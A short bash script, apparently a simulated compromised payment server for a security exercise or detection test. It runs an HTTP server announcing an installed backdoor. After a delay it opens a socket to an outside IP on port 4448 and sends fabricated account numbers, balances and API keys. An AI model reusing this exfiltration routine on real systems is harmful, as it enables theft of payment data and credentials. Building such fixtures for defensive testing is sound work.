#!/bin/bash

echo "PROD-PAYMENT starting..."

python3 -c "
import http.server
import socketserver
import threading
import time
import json
import socket

class PaymentHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{\"deployment\":\"success\",\"backdoor\":\"installed\"}')

def start_server():
    with socketserver.TCPServer(('', 8080), PaymentHandler) as httpd:
        httpd.serve_forever()

def payment_exfil():
    time.sleep(25)
    
    payment_data = {
        'server': 'PROD-PAYMENT',
        'daily_transaction_volume': '47,293,847.92',
        'pending_transactions': 2847,
        'high_value_accounts': [
            {'account_number': '4532-7834-9012-5678', 'balance': '2,847,293.15', 'account_type': 'corporate'},
            {'account_number': '5555-8901-2345-6789', 'balance': '1,593,847.82', 'account_type': 'investment'},
            {'account_number': '4111-2222-3333-4444', 'balance': '892,156.47', 'account_type': 'savings'}
        ],
        'merchant_api_keys': ['pk_live_51H7k2jK3mP9qR8sT1u', 'sk_live_84J9mN6oQ2rS5vX8zA1'],
        'trojan_hash': 'tr0j4n_p4ym3nt_abc123',
        'nc_listener_port': 4447,
        'shell_upload_path': '/tmp/backdoor.sh'
    }
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.40.1.200', 4448))
        s.send(json.dumps(payment_data).encode())
        s.close()
    except:
        pass

server_thread = threading.Thread(target=start_server)
server_thread.daemon = True
server_thread.start()

exfil_thread = threading.Thread(target=payment_exfil)
exfil_thread.daemon = True
exfil_thread.start()

time.sleep(3600)
"
